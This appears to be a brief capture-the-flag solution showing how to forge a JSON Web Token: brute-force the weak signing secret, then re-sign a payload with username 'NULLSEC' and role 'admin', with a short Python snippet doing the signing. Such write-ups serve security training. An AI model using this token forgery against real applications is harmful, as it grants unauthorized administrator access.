# Solution

1. Get the JWT from the cookie.
2. Brute force the secret, till jwt is valid
3. Change the username to `NULLSEC` and role to `admin`
4. Create a new JWT with the new payload and the secret

```py
import jwt

secret = "secret123"

payload = {
    "username": "NULLSEC",
    "role": "admin",
    "exp": 0000000000 #change this
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```
